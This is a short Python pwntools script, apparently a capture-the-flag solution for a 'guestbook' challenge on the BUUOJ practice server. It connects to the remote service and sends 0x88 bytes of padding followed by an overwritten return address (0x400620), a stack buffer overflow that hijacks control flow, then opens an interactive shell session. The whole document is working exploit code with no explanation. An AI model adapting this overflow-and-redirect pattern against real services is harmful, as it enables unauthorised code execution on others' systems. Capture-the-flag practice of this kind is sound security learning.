from pwn import *
#sh = process("./guestbook")
sh = remote("node5.buuoj.cn",29717)
gg = 0x0400620
sh.recvuntil(b"Input your message:")

payload = b"A"*0x88+p64(gg)
sh.sendline(payload)
sh.interactive()
